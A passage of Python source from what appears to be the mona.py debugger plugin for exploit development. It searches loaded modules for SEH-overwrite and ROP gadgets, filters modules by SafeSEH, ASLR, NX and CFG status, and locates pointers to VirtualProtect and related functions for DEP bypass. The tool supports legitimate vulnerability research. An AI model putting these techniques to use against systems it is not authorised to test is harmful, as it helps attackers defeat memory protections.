				if minval > 0:
					search.append("jmp " + searchcriteria + extraval)
					search.append("call " + searchcriteria + extraval)
			minval += 1

	if searchtype.lower() == "seh":
		if type == "rop":
			dbg.log("    - Looking for addresses that will help with SEH overwrite & ROP" )
		for roffset in offsets:
			for r1 in regs:
				if type == "rop":
					search.append( ["add esp,4\npop " + r1+"\npop esp\nret "+roffset,dbg.assemble("add esp,4\npop " + r1+"\npop esp\nret "+roffset)] )
					search.append( ["pop " + r1+"\nadd esp,4\npop esp\nret "+roffset,dbg.assemble("pop " + r1+"\nadd esp,4\npop esp\nret "+roffset)] )				
				else:
					search.append( ["add esp,4\npop " + r1+"\nret "+roffset,dbg.assemble("add esp,4\npop " + r1+"\nret "+roffset)] )
					search.append( ["pop " + r1+"\nadd esp,4\nret "+roffset,dbg.assemble("pop " + r1+"\nadd esp,4\nret "+roffset)] )
				for r2 in regs:
					if type == "rop":
						search.append( ["pop "+r1+"\npop "+r2+"\npop esp\nret "+roffset,dbg.assemble("pop "+r1+"\npop "+r2+"\npop esp\nret "+roffset)] )
						for r3 in regs:
							search.append( ["pop "+r1+"\npop "+r2+"\npop "+r3+"\ncall ["+r3+"]",dbg.assemble("pop "+r1+"\npop "+r2+"\npop "+r3+"\ncall ["+r3+"]")] )
					else:
						thissearch = ["pop "+r1+"\npop "+r2+"\nret "+roffset,dbg.assemble("pop "+r1+"\npop "+r2+"\nret "+roffset)]
						search.append( thissearch )
			if type != "rop":		
				search.append( ["add esp,8\nret "+roffset,dbg.assemble("add esp,8\nret "+roffset)])
				search.append( ["popad\npush ebp\nret "+roffset,dbg.assemble("popad\npush ebp\nret "+roffset)])
			else:
				search.append( ["add esp,8\npop esp\nret "+roffset,dbg.assemble("add esp,8\npop esp\nret "+roffset)])
		if type != "rop":
			#popad + jmp/call
			search.append(["popad\njmp ebp",dbg.assemble("popad\njmp ebp")])
			search.append(["popad\ncall ebp",dbg.assemble("popad\ncall ebp")])		
			#call / jmp dword
			search.append(["call dword ptr ss:[esp+08]","\xff\x54\x24\x08"])
			search.append(["call dword ptr ss:[esp+08]","\xff\x94\x24\x08\x00\x00\x00"])
			search.append(["call dword ptr ds:[esp+08]","\x3e\xff\x54\x24\x08"])

			search.append(["jmp dword ptr ss:[esp+08]","\xff\x64\x24\x08"])
			search.append(["jmp dword ptr ss:[esp+08]","\xff\xa4\x24\x08\x00\x00\x00"])
			search.append(["jmp dword ptr ds:[esp+08]","\x3e\xff\x64\x24\x08"])
			
			search.append(["call dword ptr ss:[esp+14]","\xff\x54\x24\x14"])
			search.append(["call dword ptr ss:[esp+14]","\xff\x94\x24\x14\x00\x00\x00"])	
			search.append(["call dword ptr ds:[esp+14]","\x3e\xff\x54\x24\x14"])
			
			search.append(["jmp dword ptr ss:[esp+14]","\xff\x64\x24\x14"])
			search.append(["jmp dword ptr ss:[esp+14]","\xff\xa4\x24\x14\x00\x00\x00"])		
			search.append(["jmp dword ptr ds:[esp+14]","\x3e\xff\x64\x24\x14"])
			
			search.append(["call dword ptr ss:[esp+1c]","\xff\x54\x24\x1c"])
			search.append(["call dword ptr ss:[esp+1c]","\xff\x94\x24\x1c\x00\x00\x00"])		
			search.append(["call dword ptr ds:[esp+1c]","\x3e\xff\x54\x24\x1c"])
			
			search.append(["jmp dword ptr ss:[esp+1c]","\xff\x64\x24\x1c"])
			search.append(["jmp dword ptr ss:[esp+1c]","\xff\xa4\x24\x1c\x00\x00\x00"])		
			search.append(["jmp dword ptr ds:[esp+1c]","\x3e\xff\x64\x24\x1c"])
			
			search.append(["call dword ptr ss:[esp+2c]","\xff\x54\x24\x2c"])
			search.append(["call dword ptr ss:[esp+2c]","\xff\x94\x24\x2c\x00\x00\x00"])
			search.append(["call dword ptr ds:[esp+2c]","\x3e\xff\x54\x24\x2c"])

			search.append(["jmp dword ptr ss:[esp+2c]","\xff\x64\x24\x2c"])
			search.append(["jmp dword ptr ss:[esp+2c]","\xff\xa4\x24\x2c\x00\x00\x00"])		
			search.append(["jmp dword ptr ds:[esp+2c]","\x3e\xff\x64\x24\x2c"])
			
			search.append(["call dword ptr ss:[esp+44]","\xff\x54\x24\x44"])
			search.append(["call dword ptr ss:[esp+44]","\xff\x94\x24\x44\x00\x00\x00"])		
			search.append(["call dword ptr ds:[esp+44]","\x3e\xff\x54\x24\x44"])		
			
			search.append(["jmp dword ptr ss:[esp+44]","\xff\x64\x24\x44"])
			search.append(["jmp dword ptr ss:[esp+44]","\xff\xa4\x24\x44\x00\x00\x00"])
			search.append(["jmp dword ptr ds:[esp+44]","\x3e\xff\x64\x24\x44"])
			
			search.append(["call dword ptr ss:[esp+50]","\xff\x54\x24\x50"])
			search.append(["call dword ptr ss:[esp+50]","\xff\x94\x24\x50\x00\x00\x00"])		
			search.append(["call dword ptr ds:[esp+50]","\x3e\xff\x54\x24\x50"])		
			
			search.append(["jmp dword ptr ss:[esp+50]","\xff\x64\x24\x50"])
			search.append(["jmp dword ptr ss:[esp+50]","\xff\xa4\x24\x50\x00\x00\x00"])
			search.append(["jmp dword ptr ds:[esp+50]","\x3e\xff\x64\x24\x50"])
			
			search.append(["call dword ptr ss:[ebp+0c]","\xff\x55\x0c"])
			search.append(["call dword ptr ss:[ebp+0c]","\xff\x95\x0c\x00\x00\x00"])		
			search.append(["call dword ptr ds:[ebp+0c]","\x3e\xff\x55\x0c"])		
			
			search.append(["jmp dword ptr ss:[ebp+0c]","\xff\x65\x0c"])
			search.append(["jmp dword ptr ss:[ebp+0c]","\xff\xa5\x0c\x00\x00\x00"])		
			search.append(["jmp dword ptr ds:[ebp+0c]","\x3e\xff\x65\x0c"])		
			
			search.append(["call dword ptr ss:[ebp+24]","\xff\x55\x24"])
			search.append(["call dword ptr ss:[ebp+24]","\xff\x95\x24\x00\x00\x00"])		
			search.append(["call dword ptr ds:[ebp+24]","\x3e\xff\x55\x24"])
			
			search.append(["jmp dword ptr ss:[ebp+24]","\xff\x65\x24"])
			search.append(["jmp dword ptr ss:[ebp+24]","\xff\xa5\x24\x00\x00\x00"])		
			search.append(["jmp dword ptr ds:[ebp+24]","\x3e\xff\x65\x24"])	
			
			search.append(["call dword ptr ss:[ebp+30]","\xff\x55\x30"])
			search.append(["call dword ptr ss:[ebp+30]","\xff\x95\x30\x00\x00\x00"])		
			search.append(["call dword ptr ds:[ebp+30]","\x3e\xff\x55\x30"])
			
			search.append(["jmp dword ptr ss:[ebp+30]","\xff\x65\x30"])
			search.append(["jmp dword ptr ss:[ebp+30]","\xff\xa5\x30\x00\x00\x00"])		
			search.append(["jmp dword ptr ds:[ebp+30]","\x3e\xff\x65\x30"])	
			
			search.append(["call dword ptr ss:[ebp-04]","\xff\x55\xfc"])
			search.append(["call dword ptr ss:[ebp-04]","\xff\x95\xfc\xff\xff\xff"])		
			search.append(["call dword ptr ds:[ebp-04]","\x3e\xff\x55\xfc"])
			
			search.append(["jmp dword ptr ss:[ebp-04]","\xff\x65\xfc",])
			search.append(["jmp dword ptr ss:[ebp-04]","\xff\xa5\xfc\xff\xff\xff",])		
			search.append(["jmp dword ptr ds:[ebp-04]","\x3e\xff\x65\xfc",])		
			
			search.append(["call dword ptr ss:[ebp-0c]","\xff\x55\xf4"])
			search.append(["call dword ptr ss:[ebp-0c]","\xff\x95\xf4\xff\xff\xff"])		
			search.append(["call dword ptr ds:[ebp-0c]","\x3e\xff\x55\xf4"])
			
			search.append(["jmp dword ptr ss:[ebp-0c]","\xff\x65\xf4",])
			search.append(["jmp dword ptr ss:[ebp-0c]","\xff\xa5\xf4\xff\xff\xff",])		
			search.append(["jmp dword ptr ds:[ebp-0c]","\x3e\xff\x65\xf4",])
			
			search.append(["call dword ptr ss:[ebp-18]","\xff\x55\xe8"])
			search.append(["call dword ptr ss:[ebp-18]","\xff\x95\xe8\xff\xff\xff"])		
			search.append(["call dword ptr ds:[ebp-18]","\x3e\xff\x55\xe8"])
			
			search.append(["jmp dword ptr ss:[ebp-18]","\xff\x65\xe8",])
			search.append(["jmp dword ptr ss:[ebp-18]","\xff\xa5\xe8\xff\xff\xff",])		
			search.append(["jmp dword ptr ds:[ebp-18]","\x3e\xff\x65\xe8",])
	return search

	
def getModulesToQuery(criteria, from_memory=False, peb_order="load"):
	"""
	This function will return an array of modulenames
	
	Arguments:
	Criteria - dictionary with module criteria
	
	Return:
	array with module names that meet the given criteria

	"""	

	dbgp(get_current_function_name())
	dbgp("function criteria: %s" % criteria)
	populateModuleInfo(from_memory=from_memory, peb_order=peb_order)
	dbgp("g_modules: %d entries" % len(mnproc.g_modules))
	modulestoquery=[]

	# Build exclusion set once from config
	excluded_prefixes = []
	try:
		excludedlist = MnConfig().get("excluded_modules")
		if excludedlist:
			excluded_prefixes = [e.lower().strip() for e in re.split(r"[;,]", excludedlist) if e.strip()]
	except Exception:
		pass

	for thismodule, modproperties in mnproc.g_modules.items():
		dbgp("Check if module %s should be filtered" % thismodule)
		dbgp("  Properties: %s" % modproperties)

		is_excluded = any(thismodule.lower().startswith(p) for p in excluded_prefixes)
		included = True

		if not is_excluded:
			filter_map = {
				"safeseh": ("safeseh", "SAFESEH"),
				"aslr":    ("aslr",    "ASLR"),
				"rebase":  ("rebase",  "REBASE"),
				"os":      ("os",      "OS"),
				"nx":      ("nx",      "NX"),
				"cfg":     ("cfg",     "CFG"),
			}

			for critkey, (propkey, dbgname) in filter_map.items():
				if critkey in criteria:
					keep_criteria = str_to_bool(criteria[critkey])
					module_state = modproperties[propkey]

					dbgp("   %s needs to be %s (=%s)" % (dbgname, criteria[critkey], keep_criteria))
					dbgp("   Module state: %s" % module_state)

					if module_state != keep_criteria:
						included = False
						dbgp("   -> mismatch! removing from list because of %s" % dbgname)
						break

		else:
			included = False
			dbgp("   Removing from list because it's an excluded module (mona.ini)")


		dbgp("   After criteria check: included = %s" % included)
		# filter by path regex ?
		mod_path = modproperties.get("path", "")
		if included and ("cmp" in criteria) and criteria["cmp"]:
			try:
				if not re.search(criteria["cmp"], str(mod_path), re.IGNORECASE):
					included = False
			except re.error:
				included = False
		#override all previous decision if "modules" criteria was provided
		
		just_filename = os.path.basename(mod_path.lower().strip())

		if ("modules" in criteria) and (criteria["modules"] != ""):
			included = False
			modulenames=criteria["modules"].split(",")
			for modulename in modulenames:
				# don't use the imagename, but use the filename instead
				# extract it from the full path first

				modulename = modulename.strip('"').strip("'").lower()
				modulenamewithout = modulename.replace("*","")

				dbgp("Module criteria. Check %s for %s" % (just_filename,modulenamewithout))
		  
				if len(modulenamewithout) <= len(just_filename):
					#endswith ?
					if modulename[0] == "*":
						if modulenamewithout == just_filename[len(just_filename)-len(modulenamewithout):len(just_filename)]:
							if thismodule not in modulestoquery and not is_excluded:
								modulestoquery.append(thismodule)
					#startswith ?
					if modulename[len(modulename)-1] == "*":
						if (modulenamewithout == just_filename[0:len(modulenamewithout)] and not is_excluded):
							if thismodule not in modulestoquery:
								modulestoquery.append(thismodule)
					#contains ?
					if ((modulename[0] == "*" and modulename[len(modulename)-1] == "*") or (modulename.find("*") == -1)) and not is_excluded:
						if just_filename.find(modulenamewithout) > -1:
							if thismodule not in modulestoquery:
								modulestoquery.append(thismodule)

		if included:
			modulestoquery.append(thismodule)		
	return modulestoquery	
	
	
	
def getPointerAccess(address, forcedread=False):
	"""
	Returns access level of specified address, in human readable format
	
	Arguments:
	address - integer value
	
	Return:
	Access level (human readable format)
	"""
	global MemoryPageACL

	paccess = ""
	try:
		page   = dbg.getMemoryPageByAddress( address )
		if forcedread:
			# Refresh underlying page protection and invalidate the human-readable cache.
			try:
				page.protect = None
			except:
				pass
			if page in MemoryPageACL:
				del MemoryPageACL[page]
		if page in MemoryPageACL and not forcedread:
			paccess = MemoryPageACL[page]
		else:
			paccess = page.getAccess( human = True )
			MemoryPageACL[page] = paccess
	except:
		paccess = ""
	return paccess


def getModuleProperty(modname,parameter):
	"""
	Returns value of a given module property
	Argument : 
	modname - module name
	parameter name - (see populateModuleInfo())
	
	Returns : 
	value associated with the given parameter / module combination
	
	"""
	_ensureMnProc(entities=["modules"])
	modproperties = mnproc.g_modules.get(modname.strip())
	if modproperties is not None:
		return modproperties[parameter.lower()]
	return ""


def populateModuleInfo(from_memory=False, peb_order="load"):
	"""
	Populate global dictionary with information about all loaded modules.
	Skips work if the cache is already populated (and peb_order matches).
	
	Return:
	Dictionary
	"""
	dbgp(get_current_function_name())
	_ensureMnProc()
	if mnproc._is_populating_modules:
		return

	if len(mnproc.g_modules) > 0 and mnproc.g_modulesOrder == peb_order:
		return

	mnproc._is_populating_modules = True
	try:

		if not silent:
			dbg.setStatusBar("Getting modules info...")
			dbg.log("[+] Generating module info table, hang on...")
			dbg.log("    - Processing modules")
			#dbg.updateLog()
		mnproc.g_modules={}
		dbgp("Enumerating modules via getAllModules")
		if __DEBUGGERAPP__ == "WinDBG":
			allmodules=dbg.getAllModules(from_memory=from_memory, peb_order=peb_order)
		else:
			allmodules=dbg.getAllModules()
		dbgp("Number of modules found: %d" % len(allmodules))
		dbgp("keys: %s" % allmodules.keys())
		curmod = ""
		for key in allmodules.keys():
			try:    
				modinfo={}
				dbgp("Transforming %s into a MnModule object" % key)
				thismod = MnModule(key)
				dbgp("Result: %s" % thismod)
				if not thismod is None:
					modinfo["path"]		= thismod.modulePath
					modinfo["filename"] = thismod.moduleFilename
					modinfo["base"] 	= thismod.moduleBase
					modinfo["size"] 	= thismod.moduleSize
					modinfo["top"]  	= thismod.moduleTop
					modinfo["safeseh"]	= thismod.isSafeSEH
					modinfo["aslr"]		= thismod.isAslr
					modinfo["nx"]		= thismod.isNX
					modinfo["rebase"]	= thismod.isRebase
					modinfo["version"]	= thismod.moduleVersion
					modinfo["os"]		= thismod.isOS
					modinfo["cfg"]		= thismod.isCFG
					modinfo["name"]		= key
					modinfo["entry"]	= thismod.moduleEntry
					modinfo["codebase"]	= thismod.moduleCodebase
					modinfo["codesize"]	= thismod.moduleCodesize
					modinfo["codetop"]	= thismod.moduleCodetop
					modinfo["dllcharacteristics"]  = thismod.moduleDllCharacteristics
					modinfo["sehtable"]            = thismod.moduleSEHTable
					modinfo["sehcount"]            = thismod.moduleSEHCount
					modinfo["pdbname"]             = thismod.modulePdbName
					modinfo["pdbguidage"]          = thismod.modulePdbGuidAge
					mnproc.g_modules[thismod.moduleKey] = modinfo
				else:
					if not silent:
						dbg.log("    - Oops, potential issue with module %s, skipping module" % key)
			except Exception as e:
				if not silent:
					dbg.log("    - Unable to create MnModule for '%s', skipping module" % key)
					dbg.log("%s" % str(e))
				continue            
			
		if not silent:
			dbg.log("    - Done. Let's rock 'n roll.")
			dbg.setStatusBar("")	
			dbg.updateLog()
		mnproc.g_modulesOrder = peb_order
	finally:
		mnproc._is_populating_modules = False

def ModInfoCached(modulename):
	"""
	Check if the information about a given module is already cached in the global Dictionary
	
	Arguments:
	modulename -  name of the module to check
	
	Return:
	Boolean - True if the module info is cached
	"""
	_ensureMnProc()
	if mnproc is None:
		return False
	mod = mnproc.g_modules.get(modulename.strip())
	if not mod:
		return False
	return mod.get("base", "") != ""


def criteriaToText(criteria, toupper=False):
	"""
	Takes a dict of criteria and produces a string with all criteria=value instances 
	"""
	criteriatext = ""
	criteriaelems = []
	for crit in criteria:
		if not "=" in crit:
			if toupper:
				criteriaelems.append("%s = %s" % (crit, criteria[crit]))
			else:
				criteriaelems.append("%s = %s" % (crit.upper(), criteria[crit]))
	criteriatext = " | ".join(criteriaelems)

	return criteriatext


def showModuleTable(logfile="", modules=[], modulecriteria={}, sort_keys=None, peb_order="load"):
	"""
	Shows table with all loaded modules and their properties.

	Arguments :
	empty string - output will be sent to log window
	or
	filename - output will be written to the filename
	
	modules    - dictionary with modules to query - result of a populateModuleInfo() call
	sort_keys  - list of (key, reverse) tuples from _parse_sort_spec(), or empty list
	"""	
	thistable = ""
	thistable_display = ""
	populateModuleInfo()

	filtertext = criteriaToText(modulecriteria, True)
	excluded_by_configtext = ""
	thisconfig = MnConfig()
	allexcluded = []
	excludedlist = thisconfig.get("excluded_modules")
	if excludedlist:
		excluded_by_configtext = " Some modules may be excluded because of the 'excluded_modules' config parameter: %s" % excludedlist

	_POST_SORT_FIELDS = {k: v["key"] for k, v in MODULE_COLUMNS.items()}
	items = list(mnproc.g_modules.items())
	if sort_keys:
		# Apply compound sort in reverse key order so first key wins (stable sort)
		for key, reverse in reversed(sort_keys):
			if key in _POST_SORT_FIELDS:
				items = sorted(items, key=_POST_SORT_FIELDS[key], reverse=reverse)


	if _sym_cache_dirs is None:
		_ensureSymbolCache(auto_fix=False)
	show_sym = _sym_cache_dirs is not None

	linelength = 175
	thistable += ("-" * linelength) + "\n"
	thistable += " Total nr of modules loaded: %d | Nr of modules displayed after filters: %d" % (len(mnproc.g_modules), len(modules))
	_PEB_ORDER_DISPLAY = {"load": "InLoadOrder", "memory": "InMemoryOrder", "init": "InInitializationOrder"}
	thistable += " | PEB order: %s\n" % _PEB_ORDER_DISPLAY.get(peb_order, peb_order)
	if sort_keys:
		sort_desc = " -> ".join("%s (%s)" % (k, "descending" if r else "ascending") for k, r in sort_keys)
		thistable += ("-" * linelength) + "\n"
		thistable += " Sort applied: %s\n" % sort_desc
	if filtertext != "":
		thistable += ("-" * linelength) + "\n"
		thistable += " Module filter applied: %s\n" % (filtertext)
	if excluded_by_configtext != "":
		thistable += ("-" * linelength) + "\n"
		thistable += ("%s\n" % excluded_by_configtext)
	thistable += ("-" * linelength) + "\n"
	if arch == 32:
		thistable += " Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Version, [ImageName] {Symbols} (Path), DLLCharacteristics\n"
	elif arch == 64:
		thistable += " Base               | Top                | Size               | Rebase | ASLR  | CFG   | NXCompat | OS Dll | Version, [ImageName] {Symbols} (Path), DLLCharacteristics\n"
	thistable += ("-" * linelength) + "\n"

	thistable_display = thistable

	for thismodule,modproperties in items:
		if (len(modules) > 0 and modproperties["name"] in modules or len(logfile)>0):
			rebase	= toSize(str(modproperties["rebase"]),7)
			base 	= toSize(str("0x" + toHex(modproperties["base"])),10)
			top 	= toSize(str("0x" + toHex(modproperties["top"])),10)
			size 	= toSize(str("0x" + toHex(modproperties["size"])),10)
			safeseh = toSize(str(modproperties["safeseh"]),7)
			aslr 	= toSize(str(modproperties["aslr"]),5)
			cfg 	= toSize(str(modproperties["cfg"]),5)
			nx 		= toSize(str(modproperties["nx"]),7)
			isos 	= toSize(str(modproperties["os"]),7)
			version = str(modproperties["version"])
			path 	= str(modproperties["path"])
			name = str(modproperties["filename"] or modproperties["name"])
			name_click	= clickModuleName(str(modproperties["filename"] or modproperties["name"]))
			dllflag = "0x%x" % modproperties["dllcharacteristics"]
			sym_tag = ""
			if show_sym:
				has_sym = _hasSymbolsCached(modproperties)
				sym_tag = " {%s}" % str(bool(has_sym))
			if arch == 32:
				thistable += " " + base + " | " + top + " | " + size + " | " + rebase +"| " +safeseh + " | " + aslr + " | "+ cfg + " |  " + nx + " | " + isos + "| " + version + " [" + name + "]" + sym_tag + " (" + path + ") " + dllflag + "\n"
				thistable_display += " " + base + " | " + top + " | " + size + " | " + rebase +"| " +safeseh + " | " + aslr + " | "+ cfg + " |  " + nx + " | " + isos + "| " + version + " [" + clickModuleName(name) + "]" + sym_tag + " (" + path + ") " + dllflag + "\n"
			if arch == 64:
				thistable += " " + base + " | " + top + " | " + size + " | " + rebase +"| " + aslr + " | "+ cfg + " |  " + nx + " | " + isos + "| " + version + " [" + name + "]" + sym_tag + " (" + path + ") " + dllflag + "\n"
				thistable_display += " " + base + " | " + top + " | " + size + " | " + rebase +"| " + aslr + " | "+ cfg + " |  " + nx + " | " + isos + "| " + version + " [" + clickModuleName(name) + "]" + sym_tag + " (" + path + ") " + dllflag + "\n"
	thistable += ("-" * linelength) + "\n"
	thistable_display += ("-" * linelength) + "\n"
	tableinfo = thistable.split('\n')
	tableinfo_display = thistable_display.split('\n')
	if logfile == "":
		for tline in tableinfo_display:
			dbg.log(tline)
	else:
		dbgp("showModuleTable: writing %d chars to %s" % (len(thistable), logfile))
		try:
			with open(logfile,"a") as fh:
				fh.write(thistable)
		except Exception as e:
			dbgp("showModuleTable: write failed: %s" % str(e), errormode=False)
		
#-----------------------------------------------------------------------#
# This is where the action is
#-----------------------------------------------------------------------#	

def processResults(all_opcodes,logfile,thislog,specialcases = {},ptronly = False, forcelower=False):
	"""
	Write the output of a search operation to log file

	Arguments:
	all_opcodes - dictionary containing the results of a search
	logfile - the MnLog object
	thislog - the filename to write to

	Return:
	written content in log file
	first 20 pointers are shown in the log window
	"""
	ptrcnt = 0
	cnt = 0

	global silent
	global ptr_to_get

	results_dict = {}
	results_dict_details = OrderedDict()

	if all_opcodes:
		dbg.log("")
		dbg.log("[+] Writing results to %s" % thislog)

		# Sort types by length (short -> long) for consistent output ordering
		sorted_types = sorted(all_opcodes.keys(), key=lambda k: len(str(k)))

		for hf in sorted_types:
			if not silent:
				try:
					if forcelower:
						results_dict[hf.lower()] = [len(all_opcodes[hf])]
					else:
						results_dict[hf] = [len(all_opcodes[hf])]
				except:
					results_dict["unable to display"] = [len(all_opcodes[hf])]

		dbg.log("")
		headers = ["Type", "Number"]
		types   = ["string", "int"]

		print_dict_table(
			results_dict,
			headers,
			types,
			padding = "      ",
			itemsequence = sorted(results_dict.keys(), key=lambda k: len(str(k)))
		)

		if not ptronly:

			if not silent:
				dbg.log("")
				dbg.log("[+] Results: ")

			messageshown = False
			display_order = []

			# Pre-build module lookup from g_modules cache
			populateModuleInfo()
			_mod_ranges = []
			for mkey, mprops in mnproc.g_modules.items():
				_mod_ranges.append((mprops["base"], mprops["top"], mkey))
			_mod_obj_cache = {}
			_mod_str_cache = {}

			# Iterate details in the same length-based order as the summary
			for optext in sorted_types:
				pointers = all_opcodes[optext]
				for ptr in pointers:
					ptrinfo = ""
					modinfo = ""
					ptrx = MnPointer(ptr)
					# Fast module lookup from cached ranges
					modname = ""
					for _mbase, _mtop, _mkey in _mod_ranges:
						if _mbase <= ptr <= _mtop:
							modname = _mkey
							break
					extrainfo = ""
					ptrextra = ""
					if not modname == "":
						if modname not in _mod_obj_cache:
							_mod_obj_cache[modname] = MnModule(modname)
							_mod_str_cache[modname] = str(_mod_obj_cache[modname])
						modobj = _mod_obj_cache[modname]
						modstr = _mod_str_cache[modname]
						rva = 0
						if (modobj.isRebase or modobj.isAslr):
							rva = ptr - modobj.moduleBase
							ptrextra = " (b+0x" + toHex(rva) + ") "
						ptrinfo = "0x" + toHex(ptr) + ptrextra + " : " + optext + " | " + ptrx.__str__() + " " + modstr
						extrainfo = modstr
					else:
						ptrinfo = "0x" + toHex(ptr) + " : " + optext + " | " + ptrx.__str__()
						if ptrx.isOnStack():
							extrainfo = " [Stack] "
							ptrinfo += extrainfo
						elif ptrx.isInHeap():
							extrainfo = " [Heap] "
							ptrinfo += extrainfo

					logfile.write(ptrinfo,thislog)

					if (ptr_to_get > -1) or (cnt < 20):
						if not silent:
							dbgp("  %s" % ptrinfo)

						if forcelower:
							results_dict_details[ptr] = [optext.lower(), ptrextra +ptrx.__str__().strip(), extrainfo]
						else:
							results_dict_details[ptr] = [optext, ptrextra + ptrx.__str__().strip(), extrainfo]

						if ptr not in display_order:
							display_order.append(ptr)

						cnt += 1

					ptrcnt += 1

					if (ptr_to_get == -1 or ptr_to_get > 20) and cnt == 20 and not silent and not messageshown:
						dbg.log("    Please wait while I'm processing all remaining results and writing everything to file...")
						dbg.log("")
						messageshown = True

			if not silent:
				if ptr_to_get > -1:
					dbg.log("[+] Showing search result %d..." % ptr_to_get)
				elif ptrcnt > 20:
					dbg.log("[+] Done. Only the first 20 pointers are shown here. For more pointers, open %s..." % thislog)
				dbg.log("")

				if len(results_dict_details) > 0:
					headers = ["Address", "Type", "Address/ACLinfo", "Other info"]
					types   = ["pointer", "string", "string", "string"]
					print_dict_table(results_dict_details, headers, types, padding = "      ", itemsequence = display_order)

				dbg.log("")
				dbg.log("[+] Done. All results have been written to %s" % thislog)

		dbg.log("")
		dbg.log("    Found a total of %d pointers" % ptrcnt)
	else:
		dbg.log("")
		dbg.log("[+] Results: ")
		dbg.log("")
		dbg.log("    Found a total of 0 pointers")



	
def mergeOpcodes(all_opcodes,found_opcodes):
	"""
	merges two dictionaries together

	Arguments:
	all_opcodes - the target dictionary
	found_opcodes - the source dictionary

	Return:
	Dictionary (merged dictionaries)
	"""
	if found_opcodes:
		for hf in found_opcodes:
			if hf in all_opcodes:
				if isinstance(all_opcodes[hf], dict):
					all_opcodes[hf].update(found_opcodes[hf])
				else:
					all_opcodes[hf] += found_opcodes[hf]
			else:
				all_opcodes[hf] = found_opcodes[hf]
	return all_opcodes

	
def findSEH(modulecriteria={},criteria={}):
	"""
	Performs a search for pointers to gain code execution in a SEH overwrite exploit

	Arguments:
	modulecriteria - dictionary with criteria modules need to comply with.
	                 Default settings are : ignore aslr, rebase and safeseh protected modules
	criteria - dictionary with criteria the pointers need to comply with.

	Return:
	Dictionary (pointers)
	"""
	type = ""
	if "rop" in criteria:
		type = "rop"
	search = getSearchSequences("seh",0,type) 
	
	found_opcodes = {}
	all_opcodes = {}
		
	modulestosearch = getModulesToQuery(modulecriteria)
	if not silent:
		dbg.log("[+] Criteria: %s" % criteriaToText(modulecriteria))
		dbg.log("[+] Querying %d modules" % len(modulestosearch))
	
	starttime = datetime.datetime.now()
	# Refresh the memory page list once here so per-module searchInModule calls
	# do not each trigger a full page re-enumeration (searchInRange refresh_pages=False).
	dbg.getMemoryPages()
	for thismodule in modulestosearch:
		if not silent:
			dbg.log("    - Querying module %s" % thismodule)
		dbg.updateLog()
		#search
		found_opcodes = searchInModule(search, thismodule, criteria, refresh_pages=False)
		#merge results
		all_opcodes = mergeOpcodes(all_opcodes,found_opcodes)
	#search outside modules
	if "all" in criteria:
		if "accesslevel" in criteria:
			if criteria["accesslevel"].find("R") == -1:
				if not silent:
					dbg.log("[+] Setting pointer access level criteria to 'R', to increase search results")
				criteria["accesslevel"] = "R"
				if not silent:
					dbg.log("    New pointer access level : %s" % criteria["accesslevel"])
		if criteria["all"]:
			rangestosearch = getRangesOutsideModules()
			if not silent:
				dbg.log("[+] Querying memory outside modules")
			for thisrange in rangestosearch:
				if not silent:
					dbg.log("    - Querying 0x%08x - 0x%08x" % (thisrange[0],thisrange[1]))
				found_opcodes = searchInRange(search, thisrange[0], thisrange[1], criteria, refresh_pages=False)
				all_opcodes = mergeOpcodes(all_opcodes,found_opcodes)
			if not silent:
				dbg.log("    - Search complete, processing results")
			dbg.updateLog()
	return all_opcodes
	

def findJMP(modulecriteria={},criteria={},register="esp"):
	"""
	Performs a search for pointers to jump to a given register

	Arguments:
	modulecriteria - dictionary with criteria modules need to comply with.
	                 Default settings are : ignore aslr and rebased modules
	criteria - dictionary with criteria the pointers need to comply with.
	register - the register to jump to

	Return:
	Dictionary (pointers)
	"""
	search = getSearchSequences("jmp",register,"",criteria) 
	
	found_opcodes = {}
	all_opcodes = {}
		
	modulestosearch = getModulesToQuery(modulecriteria)
	if not silent:
		dbg.log("[+] Criteria: %s" % criteriaToText(modulecriteria))
		dbg.log("[+] Querying %d modules" % len(modulestosearch))
	
	starttime = datetime.datetime.now()
	for thismodule in modulestosearch:
		if not silent:
			dbg.log("    - Querying module %s" % thismodule)
		dbg.updateLog()
		#search
		found_opcodes = searchInModule(search,thismodule,criteria)
		#merge results
		all_opcodes = mergeOpcodes(all_opcodes,found_opcodes)
	if not silent:
		dbg.log("    - Search complete, processing results")
	dbg.updateLog()
	return all_opcodes	


	
def findROPFUNC(modulecriteria={},criteria={},searchfuncs=[]):
	"""
	Performs a search for pointers to pointers to interesting functions to facilitate a ROP chain

	Arguments:
	modulecriteria - dictionary with criteria modules need to comply with.
	                 Default settings are : ignore aslr and rebased modules
	criteria - dictionary with criteria the pointers need to comply with.
	optional :
	searchfuncs - array with functions to include in the search

	Return:
	Dictionary (pointers)
	"""

	dbgp(get_current_function_name())

	found_opcodes = {}
	all_opcodes = {}
	ptr_counter = 0
	ropfuncs = {}
	funccallresults = []
	ropfuncoffsets = {}
	functionnames = []
	offsets = {}
	
	modulestosearch = getModulesToQuery(modulecriteria)
	if searchfuncs == []:
		functionnames = ["virtualprotect","virtualalloc","heapalloc","winexec","setprocessdeppolicy","heapcreate","setinformationprocess","writeprocessmemory","memcpy","memmove","strncpy","createmutex","getlasterror","strcpy","loadlibrary","freelibrary","getmodulehandle","getprocaddress","openfile","createfile","createfilemapping","mapviewoffile","openfilemapping"]
		offsets["kernel32.dll"] = ["virtualprotect","virtualalloc","writeprocessmemory"]
		# on newer OSes, functions are stored in kernelbase.dll
		offsets["kernelbase.dll"] = ["virtualprotect","virtualalloc","writeprocessmemory"]
	else:
		functionnames = searchfuncs
		offsets["kernel32"] = searchfuncs
		# on newer OSes, functions are stored in kernelbase.dll
		offsets["kernelbase.dll"] = searchfuncs
	if not silent:
		dbg.log("[+] Looking for pointers to interesting functions...")
		dbg.log("[+] Criteria in use: %s" % criteriaToText(modulecriteria))
	curmod = ""

	
	offsetpointers = {}
	
	# populate absolute pointers
	for themod in offsets:
		fnames = offsets[themod]
		try:
			themodule = MnModule(themod)
			if not themodule is None:
				allfuncs = themodule.getEAT()
				for fn in allfuncs:
					for fname in fnames:
						if allfuncs[fn].lower().find(fname.lower()) > -1:
							#dbg.log("Found match: %s %s -> %s ?" % (themod, allfuncs[fn].lower(), fname.lower()))
							fname = allfuncs[fn].lower()
							if not fname in offsetpointers:
								offsetpointers[fname] = fn
							break
		except:
			continue

	# found pointers to functions
	# now query IATs
	# dbg.log("%s" % modulecriteria)		
	isrebased = False
	nrkeys = len(modulestosearch)
	keycnt = 1
	for key in modulestosearch:
